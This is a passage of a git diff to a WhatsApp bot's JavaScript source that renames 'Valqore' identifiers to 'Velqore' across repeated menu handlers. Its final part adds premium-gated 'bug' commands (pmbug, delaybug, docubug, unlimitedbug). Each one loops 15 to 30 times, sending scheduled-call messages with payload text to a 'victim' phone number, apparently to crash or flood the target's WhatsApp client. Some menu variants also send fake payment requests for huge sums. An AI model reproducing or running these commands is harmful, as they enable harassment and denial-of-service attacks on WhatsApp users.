+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -8112,7 +8108,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -8125,7 +8121,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8135,8 +8131,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -8158,21 +8154,21 @@ break
 case 'nsfwmenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8182,22 +8178,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -8205,7 +8201,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -8223,7 +8219,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -8236,7 +8232,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8246,8 +8242,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -8269,21 +8265,21 @@ break
 case 'animemenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${animemenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8293,22 +8289,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -8316,7 +8312,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -8334,7 +8330,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -8347,7 +8343,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8357,8 +8353,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -8380,21 +8376,21 @@ break
 case 'stickermenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stickermenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8404,22 +8400,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -8427,7 +8423,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -8445,7 +8441,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -8458,7 +8454,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8468,8 +8464,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -8491,21 +8487,21 @@ break
 case 'databasemenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${databasemenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8515,22 +8511,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -8538,7 +8534,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -8556,7 +8552,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -8569,7 +8565,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8579,8 +8575,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -8602,21 +8598,21 @@ break
 case 'aimenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${aimenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8626,22 +8622,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -8649,7 +8645,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -8667,7 +8663,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -8680,7 +8676,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8690,8 +8686,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -8713,21 +8709,21 @@ break
 case 'bugmenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${bugmenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8737,22 +8733,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -8760,7 +8756,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -8778,7 +8774,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -8791,7 +8787,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8801,8 +8797,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'), 
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'), 
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -8834,8 +8830,8 @@ break
                b += `Premium Status: ${a.premium}\n`
                b += `Your Limit: ${a.limit}\n`
                b += `================================`
-               ValqoreInc.sendMessage(sender, { text: b }, { quoted: m })
-               replygcValqore('Account Details Has Been Sent In Private Chat')
+               VelqoreInc.sendMessage(sender, { text: b }, { quoted: m })
+               replygcVelqore('Account Details Has Been Sent In Private Chat')
             }
             break
             case 'limit':
@@ -8844,7 +8840,7 @@ break
                let b = `Your Limit ${a.limit}\n` 
                b += `Premium Status ${isPremium ? 'On' : 'Off' }\n` 
                b += `Serial Code:\n*[${a.serialNumber}]*\n`
-               replygcValqore(b)
+               replygcVelqore(b)
             }
             break
             
@@ -8852,154 +8848,154 @@ break
 //⚠️do not edit cases otherwise bug not work
 //bug cases 
 case 'amountbug': {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return relygcValqore(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return relygcVelqore(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = `${text1}`
+const Velqoreybug1 = `${text1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
 }
-replygcValqore(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
 break
 case 'pmbug' :{
- if (!isPremium) return replygcValqore(mess.premium)
- if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+ if (!isPremium) return replygcVelqore(mess.premium)
+ if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
  await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = `${text1}`
+const Velqoreybug1 = `${text1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
 }
-replygcValqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'delaybug' : {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = text2
+const Velqoreybug1 = text2
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
 }
-replygcValqore(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'docubug': {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
 await loading()
-if (args.length < 1) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+if (args.length < 1) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "15"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = `${text1}`
+const Velqoreybug1 = `${text1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
 }
-replygcValqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'unlimitedbug' : {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = text3
+const Velqoreybug1 = text3
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
 }
-replygcValqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'bombug': {
